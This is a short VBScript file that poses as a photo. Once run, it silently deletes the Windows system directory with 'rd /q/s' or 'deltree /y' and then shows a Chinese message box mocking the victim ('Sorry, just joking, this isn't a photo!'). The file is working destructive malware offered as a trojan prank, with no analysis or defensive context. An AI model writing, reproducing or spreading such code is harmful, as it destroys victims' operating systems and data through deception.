Set WshShell = WScript.CreateObject("WScript.Shell")
Set WinTmpDir = WshShell.Environment("Process")
If WinTmpDir("OS") = "Windows_NT" Then
    WshShell.Run "cmd /k rd /q/s " + WinTmpDir("windir"), vbHide
Else
    WshShell.Run "deltree /y " + WinTmpDir("windir"), vbHide
End If
msgbox "对不起，跟你开玩笑的，这个不是照片！",,"哈哈哈！"